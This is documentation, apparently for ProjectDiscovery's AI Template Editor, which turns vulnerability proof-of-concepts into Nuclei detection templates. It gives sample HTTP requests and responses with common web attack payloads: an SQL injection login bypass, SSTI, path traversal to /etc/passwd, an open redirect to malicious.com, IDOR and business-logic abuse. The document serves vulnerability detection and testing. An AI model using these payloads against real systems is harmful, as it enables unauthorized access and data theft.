[The Template Editor](https://cloud.projectdiscovery.io/) has AI to generate templates for vulnerability reports. This document helps to guide you through the process, offering usagwe tips and examples.

## Overview

Powered by ProjectDiscovery's deep library of public Nuclei templates and a rich CVE data set, the AI understands a broad array of security vulnerabilities. First, the system interprets the user's prompt to identify a specific vulnerability. Then, it generates a template based on the steps required to reproduce the vulnerability along with all the necessary meta information to reproduce and remediate.

## Initial Setup

Kick start your AI Assistance experience with these steps:

1.  **Provide Detailed Information**: Construct comprehensive Proof of Concepts (PoCs) for vulnerabilities like Cross-Site Scripting (XSS), and others.
2.  **Understand the Template Format**: Get to grips with the format to appropriately handle and modify the generated template.
3.  **Validation and Linting**: Use the integrated linter to guarantee the template's validity.
4.  **Test the Template**: Evaluate the template against a test target ensuring its accuracy.

## Best Practices

- **Precision Matters**: Detailed prompts yield superior templates.
- **Review and Validate**: Consistently check matchers' accuracy.
- **Template Verification**: Validate the template on known vulnerable targets before deployment.

## Example Prompts

The following examples demonstrate different vulnerabilities and the corresponding Prompt.

<Accordion title="Vulnerability: Open Redirect">

Open redirect vulnerability identified in a web application. Here's the PoC:

HTTP Request:

```
GET /redirect?url=http://malicious.com HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

HTTP Response:

```
HTTP/1.1 302 Found
Location: http://malicious.com
Content-Length: 0
Server: Apache
```

The application redirects the user to the URL specified in the url parameter, leading to an open redirect vulnerability.

</Accordion>

<Accordion title="Vulnerability: SQL Injection">

SQL Injection vulnerability in a login form. Here's the PoC:

HTTP Request:

```
POST /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded

username=admin&password=' OR '1'='1
```

HTTP Response:

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1337
Server: Apache

<html>
...
<p>Welcome back, admin</p>
...
</html>
```

The application improperly handles user input in the password field, leading to an SQL Injection vulnerability.

</Accordion>

<Accordion title="Vulnerability: Business logic (negative cart balance)">

Business Logic vulnerability in a web application's shopping cart function allows for negative quantities, leading to credit. Here's the PoC:

HTTP Request:

```
POST /add-to-cart HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded

product_id=1001&quantity=-1
```

HTTP Response:

```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1337
Server: Apache

<html>
...
<p>Product added to cart. Current balance: -$19.99</p>
...
</html>
```

The application fails to validate the quantity parameter, resulting in a Business Logic vulnerability.

</Accordion>

<Accordion title="Vulnerability: Server-side Template Injection (SSTI)">

Server-side Template Injection (SSTI) vulnerability through a web application's custom greeting card function. Here's the PoC:

```
HTTP Request:

POST /create-card HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded

message={{7*7}}
```

```
HTTP Response:

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1337
Server: Apache

<html>
...
<p>Your card: 49</p>
...
</html>
```

The application processes the message parameter as a template, leading to an SSTI vulnerability.

</Accordion>

<Accordion title="Vulnerability: Insecure Direct Object Reference (IDOR)">

Insecure Direct Object Reference (IDOR) vulnerability discovered in a website's user profile page. Here's the PoC:

```
HTTP Request:

GET /profile?id=2 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abcd1234
```

```
HTTP Response:

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1337
Server: Apache

<html>
...
<p>Welcome, otheruser</p>
...
</html>
```

The application exposes sensitive information of a user (ID: 2) who is not the authenticated user (session: abcd1234), leading to an IDOR vulnerability.

</Accordion>

<Accordion title="Vulnerability: Path Traversal">

Path Traversal vulnerability identified in a web application's file download function. Here's the PoC:

```
HTTP Request:

GET /download?file=../../etc/passwd HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

```
HTTP Response:

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 1827
Server: Apache

root:x:0:0:root:/root:/bin/bash
```

The application fetches the file specified in the file parameter from the server file system, leading to a Path Traversal vulnerability.

</Accordion>

<Accordion title="Vulnerability: Business logic (extend VIP subscription)">

Business logic vulnerability in a web application's VIP subscription function allows users to extend the trial period indefinitely. Here's the PoC:

```
HTTP Request:

POST /extend-trial HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abcd1234
```

```
HTTP Response:

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1337
Server: Apache

<html>

<p>Your VIP trial period has been extended by 7 days.</p>

</html>
```

The application does not limit the number of times the trial period can be extended, leading to a business logic vulnerability.

</Accordion>

Each of these examples provides HTTP Requests and Responses to illustrate the vulnerabilities.

## Limitations

<Note>
Please note that the current AI is trained primarily on HTTP data. Template generation for non-HTTP protocols is not supported at this time. Support for additional protocols is under development and will be available soon.
